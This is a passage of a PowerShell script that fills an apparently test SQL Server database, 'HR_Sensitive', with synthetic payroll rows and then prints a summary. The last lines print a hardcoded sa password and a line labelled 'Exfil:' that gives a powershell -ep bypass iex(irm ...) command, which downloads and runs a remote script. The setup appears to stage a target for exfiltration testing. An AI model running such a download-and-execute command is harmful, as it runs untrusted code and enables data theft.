        DATEADD(SECOND, -(ABS(CHECKSUM(NEWID())) % 7776000), GETDATE())
    FROM master..spt_values a CROSS JOIN master..spt_values b;

    SET @batch = @batch + @batchSize;
    IF @batch % 200000 = 0 RAISERROR('  SecurityEvents: %d / %d', 0, 1, @batch, @total) WITH NOWAIT;
END
"@

# ─── PAYROLL TRANSACTIONS (~600k rows) ────────────────────────────────────────
Write-Host "[8/9] Generating PayrollTransactions (~600k rows)..." -ForegroundColor Cyan

Invoke-Sql -Silent @"
USE HR_Sensitive;
SET NOCOUNT ON;

DECLARE @batch INT = 0;
DECLARE @batchSize INT = 50000;
DECLARE @total INT = 600000;

WHILE @batch < @total
BEGIN
    INSERT INTO dbo.PayrollTransactions (EmployeeID, PayPeriodStart, PayPeriodEnd, GrossPay, FederalTax, StateTax, FICA, NetPay, BankAccount, RoutingNo, ProcessedAt, Status)
    SELECT TOP (@batchSize)
        ABS(CHECKSUM(NEWID())) % 600 + 1,
        DATEADD(DAY, -(ABS(CHECKSUM(NEWID())) % 1095), CAST(GETDATE() AS DATE)),
        DATEADD(DAY, 13, DATEADD(DAY, -(ABS(CHECKSUM(NEWID())) % 1095), CAST(GETDATE() AS DATE))),
        CAST(ABS(CHECKSUM(NEWID())) % 15000 + 1500 AS DECIMAL(10,2)),
        CAST(ABS(CHECKSUM(NEWID())) % 3000 + 200 AS DECIMAL(10,2)),
        CAST(ABS(CHECKSUM(NEWID())) % 1200 + 50 AS DECIMAL(10,2)),
        CAST(ABS(CHECKSUM(NEWID())) % 900 + 100 AS DECIMAL(10,2)),
        CAST(ABS(CHECKSUM(NEWID())) % 10000 + 1000 AS DECIMAL(10,2)),
        CAST(ABS(CHECKSUM(NEWID())) % 9000000000 + 1000000000 AS NVARCHAR(30)),
        '0' + CAST(ABS(CHECKSUM(NEWID())) % 89999999 + 21000000 AS NVARCHAR) + '0',
        DATEADD(DAY, -(ABS(CHECKSUM(NEWID())) % 1095), GETDATE()),
        CASE ABS(CHECKSUM(NEWID())) % 20 WHEN 0 THEN 'Failed' WHEN 1 THEN 'Reversed' ELSE 'Processed' END
    FROM master..spt_values a CROSS JOIN master..spt_values b;

    SET @batch = @batch + @batchSize;
    IF @batch % 200000 = 0 RAISERROR('  PayrollTransactions: %d / %d', 0, 1, @batch, @total) WITH NOWAIT;
END
"@

# ─── SUMMARY ──────────────────────────────────────────────────────────────────
Write-Host "[9/9] Verifying..." -ForegroundColor Cyan
Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  HR_Sensitive — Setup Complete" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green

$tables = @("Employees","Credentials","PayrollAudit","EmailArchive","DocumentRepository","SecurityEvents","PayrollTransactions","VPNSessions")
foreach ($t in $tables) {
    $n = Get-RowCount "HR_Sensitive" $t
    Write-Host ("  dbo.{0,-25} {1,10} rows" -f ($t + " "), $n) -ForegroundColor White
}

$mb = Get-DbSizeMB "HR_Sensitive"
$gb = [Math]::Round($mb / 1024, 2)
Write-Host ""
Write-Host "  Total size: $mb MB (~$gb GB)" -ForegroundColor Cyan
Write-Host ""
Write-Host "  DBeaver: localhost:1433 / sa / Testing123!!!!" -ForegroundColor Yellow
Write-Host "  Exfil:   powershell -ep bypass -c `"iex(irm 'https://newaifunstuff.blob.core.windows.net/tools/az-diag-collect.ps1')`"" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Green
